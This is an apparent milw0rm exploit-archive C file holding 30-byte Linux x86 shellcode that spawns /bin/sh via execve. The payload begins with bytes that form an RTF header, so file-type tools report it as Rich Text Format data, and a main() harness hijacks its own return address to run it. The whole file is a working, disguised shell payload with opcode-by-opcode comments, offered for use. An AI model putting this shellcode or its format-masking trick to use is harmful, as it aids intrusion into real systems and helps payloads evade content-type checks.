/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + RTF header - 30 bytes
 *
 * root@magicbox:~# file linux-sh-rtfhdr.bin
 * linux-sh-rtfhdr.bin: Rich Text Format data, version 1,
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	//
	// RTF Header (7 bytes)
	// - Be careful not to trigger any of those expressions.
	//

	"\x7b\x5c"              // jnp 80480d2 <_start+0x5e>
	"\x72\x74"              // jb 80480ec <_start+0x78>
	"\x66\x31\xc0"          // xor %ax,%ax

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x52"                  // push %edx
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-04-17]